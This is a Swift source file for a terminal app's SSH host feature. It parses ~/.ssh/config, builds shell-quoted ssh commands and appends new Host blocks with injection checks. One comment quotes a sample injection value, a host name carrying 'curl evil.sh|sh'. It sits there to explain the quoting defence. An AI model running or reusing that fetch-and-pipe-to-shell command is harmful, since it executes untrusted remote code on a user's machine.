// The machines this operator already told OpenSSH about.
//
// A terminal that can open a pane on a remote box does not need its own inventory of
// hosts, an account model, or a settings screen. `~/.ssh/config` is where that list
// already lives, it is already correct, and it is already the thing `ssh` itself obeys.
// So this reads it and offers what it finds. Nothing here is written back; the file is
// the operator's.
//
// WHAT THIS DELIBERATELY DOES NOT READ: `IdentityFile`, and any other key material or
// credential-shaped value. It takes the alias and the three fields needed to DESCRIBE a
// row (HostName, User, Port) and nothing else. A key path in a palette subtitle is a
// secret on screen for no gain, and `ssh` resolves identities perfectly well without
// this file's help. The child is spawned as `ssh <alias>` precisely so that every
// resolution decision stays inside OpenSSH.
//
// This is a PRODUCT feature and it lives in the Swift host on purpose. The engine is a
// pure state machine and `crates/host` publishes a C ABI with an asserted export count;
// a host list carries no policy that could disagree with itself across two copies, so
// there is nothing to gain by pushing it down and an ABI surface to disturb by trying.
// The stated cost: a future Linux host would need its own parser rather than inheriting
// this one.

import Foundation

/// One concrete entry from `~/.ssh/config`: something `ssh <alias>` will connect to.
struct SSHHost: Equatable {
    /// The `Host` alias as written. This is what gets spawned, never `hostName`.
    let alias: String
    let hostName: String?
    let user: String?
    let port: Int?

    /// The row's second line: enough to tell two similar aliases apart, and no more.
    ///
    /// Falls back to the alias itself when the config says nothing else, because an
    /// empty subtitle reads as a broken row rather than as a host with no overrides.
    var summary: String {
        let target = [user.map { "\($0)@" }, hostName ?? alias].compactMap { $0 }.joined()
        guard let port, port != 22 else { return target }
        return "\(target):\(port)"
    }
}

/// Everything the connection form collects. A value type: nothing here is stored by the
/// app, it is either spawned immediately or written into the operator's own config.
///
/// THERE IS NO PASSWORD FIELD AND THERE WILL NOT BE ONE. `ssh` accepts no password on its
/// command line, so a field would mean either holding a secret in app memory or piping one
/// into a pty, and both are worse than letting ssh prompt. `identityFile` is a PATH, which
/// is exactly what `ssh_config` itself stores, so it carries no key material either.
struct SSHConnection {
    var alias: String = ""
    var hostName: String = ""
    var user: String = ""
    var port: String = ""
    var identityFile: String = ""
    var proxyJump: String = ""
    /// Raw `-o` entries, one `Keyword=value` per line as typed.
    var options: String = ""
    var remoteCommand: String = ""

    /// Why this cannot be written or dialled, in the operator's terms, or nil when it can.
    ///
    /// The newline check is the load-bearing one and it is a SECURITY check, not tidiness:
    /// a "hostname" containing a newline followed by `Host *` and `User root` would append
    /// a global block to the operator's config that applies to every machine they own.
    /// Every field is checked, not just the obvious ones, because the injection works from
    /// any of them. `options` is exempt because it is multi-line BY DESIGN, and it is the
    /// one field whose every line is re-validated on the way out (see `optionList`).
    var refusal: String? {
        for (name, value) in [
            ("Name", alias), ("Host", hostName), ("User", user), ("Port", port),
            ("Identity file", identityFile), ("Jump host", proxyJump),
            ("Command", remoteCommand),
        ] where value.contains("\n") || value.contains("\r") {
            return "\(name) contains a line break. That would write a second block into "
                + "your ssh config, so it is refused rather than stripped."
        }
        if hostName.trimmingCharacters(in: .whitespaces).isEmpty {
            return "A host is required. Everything else is optional."
        }
        if hostName.contains(where: { $0.isWhitespace }) {
            return "A host cannot contain spaces."
        }
        if !alias.isEmpty && !SSHConfig.isOfferable(alias) {
            return "A name cannot contain spaces or the pattern characters * ? !, because "
                + "ssh would read it as a rule for other hosts rather than as one machine."
        }
        if !port.isEmpty, Int(port).map({ $0 < 1 || $0 > 65535 }) ?? true {
            return "Port must be a number from 1 to 65535."
        }
        return nil
    }

    /// The words handed to the child, for a connection that is dialled without being saved.
    ///
    /// argv, so each field is one word no matter what is in it. It reaches the pty through
    /// `commandLine`, which is where that promise is actually kept.
    var arguments: [String] {
        var argv = ["ssh"]
        if !port.isEmpty { argv += ["-p", port] }
        if !identityFile.isEmpty {
            argv += ["-i", NSString(string: identityFile).expandingTildeInPath]
        }
        if !proxyJump.isEmpty { argv += ["-J", proxyJump] }
        for option in optionList { argv += ["-o", option] }
        argv.append(user.isEmpty ? hostName : "\(user)@\(hostName)")
        if !remoteCommand.isEmpty { argv.append(remoteCommand) }
        return argv
    }

    /// `arguments`, quoted into one line safe to hand to `/bin/sh -c`.
    ///
    /// THE HOST RUNS THE COMMAND STRING THROUGH A SHELL (`crates/host/src/lib.rs`:
    /// `Command::new("/bin/sh").args(["-c", text])`), so joining argv with spaces is not a
    /// formatting choice, it is an injection. A host named `box;curl evil.sh|sh` passes
    /// every validator above - none of them has any reason to reject a semicolon - and
    /// then runs as two commands. An identity path with a space in it breaks the same way,
    /// just less dramatically.
    ///
    /// Single quotes because they are the only shell quoting with no escapes inside them
    /// at all: everything between them is literal, including `$`, backticks and newlines.
    /// The one character that cannot appear is the quote itself, hence the `'\''` dance.
    var commandLine: String {
        SSHConnection.shellQuoted(arguments)
    }

    static func shellQuoted(_ words: [String]) -> String {
        words.map { word in
            "'" + word.replacingOccurrences(of: "'", with: "'\\''") + "'"
        }.joined(separator: " ")
    }

    /// One `Keyword=value` per non-empty line, trimmed.
    var optionList: [String] {
        options.split(whereSeparator: { $0 == "\n" || $0 == "\r" })
            .map { $0.trimmingCharacters(in: .whitespaces) }
            .filter { !$0.isEmpty }
    }

    /// The `ssh_config` stanza this becomes, or nil when there is nothing to name it.
    ///
    /// `Host` takes the alias when one was given and the hostname otherwise, because a
    /// block whose alias IS its hostname is still the normal, useful shape.
    var configBlock: String? {
        let name = alias.isEmpty ? hostName : alias
        guard !name.isEmpty else { return nil }
        var lines = ["# added by mind2t", "Host \(name)"]
        if name != hostName { lines.append("    HostName \(hostName)") }
        if !user.isEmpty { lines.append("    User \(user)") }
        if !port.isEmpty { lines.append("    Port \(port)") }
        if !identityFile.isEmpty { lines.append("    IdentityFile \(identityFile)") }
        if !proxyJump.isEmpty { lines.append("    ProxyJump \(proxyJump)") }
        for option in optionList {
            // `-o Keyword=value` on the command line is `Keyword value` in a config file.
            lines.append("    " + option.replacingOccurrences(of: "=", with: " "))
        }
        if !remoteCommand.isEmpty {
            lines.append("    RemoteCommand \(remoteCommand)")
            // Without this, RemoteCommand is accepted and silently does nothing, which is
            // the worst of both: the file looks right and the command never runs.
            lines.append("    RequestTTY yes")
        }
        return lines.joined(separator: "\n")
    }
}

/// Why a save did not happen. Each case is a different thing for the operator to do.
enum SSHWriteFailure: Error {
    case invalid(String)
    case aliasExists(String)
    case unwritable(String)

    var summary: String {
        switch self {
        case .invalid(let why): return why
        case .aliasExists(let alias):
            return "\(alias) is already in your ssh config. Nothing was written -- a second "
                + "block with the same name would be shadowed by the first and look like it "
                + "had no effect. Pick another name, or edit the existing entry yourself."
        case .unwritable(let why): return "Could not write your ssh config: \(why)"
        }
    }
}

/// Reads the OpenSSH client config the way `ssh` reads it, for the subset that names a
/// host worth offering.
///
/// Not a general ssh_config implementation and not trying to be: `Match` blocks are
/// recognised only well enough to stop attributing their keys to the wrong host, and
/// tokens like `%h` are passed through untouched because they are the child's business.
enum SSHConfig {
    static let defaultPath = NSString(string: "~/.ssh/config").expandingTildeInPath

    /// Every concrete host in the file, in the order it was written.
    ///
    /// File order is kept rather than sorted alphabetically: an ssh_config is ordered
    /// most-specific-first by convention, so the operator's own ordering is information.
    /// A missing or unreadable file is an empty list, never an error - not having an ssh
    /// config is the normal state of a machine, not a fault to report.
    static func hosts(configPath: String = defaultPath) -> [SSHHost] {
        /// Aliases in the order first seen, and their fields. Both accumulate across
        /// every included file rather than per file, because ssh resolves each keyword
        /// against ONE merged stream: a value obtained inside an `Include` wins over the
        /// same keyword later in the parent. Resolving each file separately and merging
        /// afterwards inverts that, and it inverts it only for hosts that appear twice -
        /// which is the one case anybody writes an Include for.
        var order: [String] = []
        var fields: [String: [String: String]] = [:]
        parse(path: configPath, depth: 0, order: &order, fields: &fields)
        return order.map { alias in
            let own = fields[alias] ?? [:]
            return SSHHost(
                alias: alias, hostName: own["hostname"], user: own["user"],
                port: own["port"].flatMap(Int.init))
        }
    }

    /// `Include` is followed to this depth and no further. OpenSSH's own limit is 16;
    /// this is lower because a palette does not need deep nesting and a cycle in a config
    /// file must not hang the app.
    private static let maximumIncludeDepth = 8

    private static func parse(
        path: String, depth: Int, order: inout [String], fields: inout [String: [String: String]]
    ) {
        guard depth <= maximumIncludeDepth,
            let data = FileManager.default.contents(atPath: path)
        else { return }

        /// The aliases the current `Host` line opened. A `Match` line closes them: its
        /// keys belong to a conditional block, and attributing them to the host above
        /// would put a stranger's user name on this row.
        var open: [String] = []

        for rawLine in String(decoding: data, as: UTF8.self).split(
            separator: "\n", omittingEmptySubsequences: false)
        {
            guard let (keyword, value) = directive(in: String(rawLine)) else { continue }
            switch keyword {
            case "host":
                open = words(in: value).filter(isOfferable)
                for alias in open where fields[alias] == nil {
                    fields[alias] = [:]
                    order.append(alias)
                }
            case "match":
                open = []
            case "include":
                let base = (path as NSString).deletingLastPathComponent
                for included in words(in: value).flatMap({ expand($0, relativeTo: base) }) {
                    parse(path: included, depth: depth + 1, order: &order, fields: &fields)
                }
            // First value wins, per alias per keyword - ssh's own rule. Getting it
            // backwards makes the LAST assignment win, which is a bug that appears only
            // on the one host with a duplicated key and looks like a typo until it is not.
            case "hostname", "user", "port":
                for alias in open where fields[alias]?[keyword] == nil {
                    fields[alias]?[keyword] = value
                }
            default:
                continue
            }
        }
    }

    /// Splits `keyword value` or `keyword=value`, lowercasing only the keyword.
    ///
    /// ssh_config keywords are case-insensitive and values are NOT, so a blanket
    /// lowercase would quietly rewrite user names and hostnames on case-sensitive
    /// systems. Both separators are legal and both appear in real configs.
    private static func directive(in line: String) -> (String, String)? {
        let trimmed = line.trimmingCharacters(in: .whitespaces)
        guard !trimmed.isEmpty, !trimmed.hasPrefix("#") else { return nil }
        guard let split = trimmed.firstIndex(where: { $0 == "=" || $0.isWhitespace }) else {
            return nil
        }
        let keyword = trimmed[trimmed.startIndex..<split].lowercased()
        let rest = trimmed[trimmed.index(after: split)...]
            .drop { $0 == "=" || $0.isWhitespace }
        guard !keyword.isEmpty, !rest.isEmpty else { return nil }
        return (keyword, unquoted(String(rest)))
    }

    /// Whitespace-separated words, each unquoted. `Host` and `Include` both take a list.
    private static func words(in value: String) -> [String] {
        value.split(whereSeparator: { $0.isWhitespace }).map { unquoted(String($0)) }
    }

    private static func unquoted(_ value: String) -> String {
        guard value.count >= 2, value.hasPrefix("\""), value.hasSuffix("\"") else { return value }
        return String(value.dropFirst().dropLast())
    }

    /// A pattern is offerable only when it names exactly one machine.
    ///
    /// `*` and `?` are matchers and `!` is a negation; every one of them describes a RULE
    /// for other hosts rather than a host. Offering `Host *` as a row would spawn
    /// `ssh *`, which is a connection attempt to a literal asterisk.
    static func isOfferable(_ pattern: String) -> Bool {
        !pattern.isEmpty
            && !pattern.contains(where: { $0 == "*" || $0 == "?" || $0 == "!" || $0.isWhitespace })
    }

    /// Appends `connection` to the config as a new `Host` block.
    ///
    /// APPEND ONLY, and that is the whole safety argument. This is the operator's file and
    /// not one this app authored, so no byte already in it is ever rewritten: the block is
    /// handed to a single `write` at the end of the file. The alternative shape - read,
    /// modify, write to a temp file, rename over the original - fails much worse, because
    /// a bug anywhere in that sequence replaces the entire config with whatever the buggy
    /// copy produced. The realistic worst case here is a truncated trailing block, which
    /// ssh reports as a syntax error on a line the operator can see and delete, and which
    /// leaves every host above it untouched.
    ///
    /// A duplicate alias is REFUSED rather than appended. ssh takes the first value it
    /// obtains, so a second block with the same name is silently shadowed by the first -
    /// the operator would see a saved host that behaves as if their settings were ignored.
    @discardableResult
    static func append(
        _ connection: SSHConnection, configPath: String = defaultPath
    ) -> Result<String, SSHWriteFailure> {
        if let why = connection.refusal { return .failure(.invalid(why)) }
        guard let block = connection.configBlock else {
            return .failure(.invalid("A host is required."))
        }
        let name = connection.alias.isEmpty ? connection.hostName : connection.alias
        if hosts(configPath: configPath).contains(where: { $0.alias == name }) {
            return .failure(.aliasExists(name))
        }

        let manager = FileManager.default
        let directory = (configPath as NSString).deletingLastPathComponent
        do {
            if !manager.fileExists(atPath: directory) {
                // 0700 because this is `~/.ssh`. Creating it world-readable once is enough
                // for ssh to refuse keys placed in it later, with an error that names the
                // key rather than the directory.
                try manager.createDirectory(
                    atPath: directory, withIntermediateDirectories: true,
                    attributes: [.posixPermissions: 0o700])
            }
            if !manager.fileExists(atPath: configPath) {
                guard
                    manager.createFile(
                        atPath: configPath, contents: nil,
                        attributes: [.posixPermissions: 0o600])
                else { return .failure(.unwritable("could not create \(configPath)")) }
            }
            // The last byte is probed through its OWN read handle. A handle opened for
            // writing cannot be read from - it fails with EBADF, which arrives dressed as
            // Cocoa's "The file couldn't be opened" and points at nothing real.
            var separator = ""
            let reader = try FileHandle(forReadingFrom: URL(fileURLWithPath: configPath))
            let end = try reader.seekToEnd()
            if end > 0 {
                try reader.seek(toOffset: end - 1)
                // A leading newline only when the file does not already end in one, so an
                // existing last line is never joined onto `# added by mind2t`.
                separator = (try reader.read(upToCount: 1) == Data("\n".utf8)) ? "\n" : "\n\n"
            }
            try? reader.close()

            let handle = try FileHandle(forWritingTo: URL(fileURLWithPath: configPath))
            defer { try? handle.close() }
            try handle.seekToEnd()
            try handle.write(contentsOf: Data((separator + block + "\n").utf8))
        } catch {
            return .failure(.unwritable("\(error)"))
        }
        return .success(name)
    }

    /// Resolves one `Include` argument to real paths: tilde, then relative to the
    /// including file's own directory, then glob.
    ///
    /// OpenSSH documents relative includes as relative to `~/.ssh` for a user config, and
    /// for the real `~/.ssh/config` the two rules give the same answer because that IS its
    /// directory. Using the parent's directory instead makes the rule hold for any config
    /// this is pointed at, which is what lets the gate parse a fixture at all. Hardcoding
    /// `~/.ssh` here meant the include was silently skipped everywhere else, and a skipped
    /// include looks exactly like a config that simply has fewer hosts in it.
    private static func expand(_ argument: String, relativeTo base: String) -> [String] {
        var path = NSString(string: argument).expandingTildeInPath
        if !path.hasPrefix("/") {
            path = base + "/" + path
        }
        guard path.contains("*") || path.contains("?") else { return [path] }
        var results = glob_t()
        defer { globfree(&results) }
        guard glob(path, 0, nil, &results) == 0 else { return [] }
        return (0..<Int(results.gl_pathc)).compactMap { index in
            results.gl_pathv[index].map { String(cString: $0) }
        }
    }
}
